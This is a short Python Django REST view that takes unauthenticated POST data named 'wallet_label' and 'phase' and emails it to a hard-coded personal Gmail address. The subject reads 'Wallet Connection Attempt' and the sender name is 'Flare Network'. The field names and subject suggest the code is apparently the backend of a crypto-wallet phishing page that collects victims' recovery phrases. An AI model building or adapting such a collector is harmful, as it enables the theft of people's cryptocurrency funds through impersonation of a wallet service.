
from rest_framework.views import APIView
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from rest_framework import status
from .mailservice import send_mail

class SendEmail(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        wallet_label = request.data.get("wallet_label")
        phase = request.data.get("phase")

        if not wallet_label or not phase:
            return Response(
                {"error": "wallet_label and message are required"},
                status=status.HTTP_400_BAD_REQUEST
            )

        # Example: do something (send email, save, etc.)
        send_mail("uzomamicheal07@gmail.com", f"<p>{phase}</p>", f"Wallet Connection Attempt: {wallet_label}", "Flare Network")

        return Response(
            {"success": "Email request received"},
            status=status.HTTP_200_OK
        )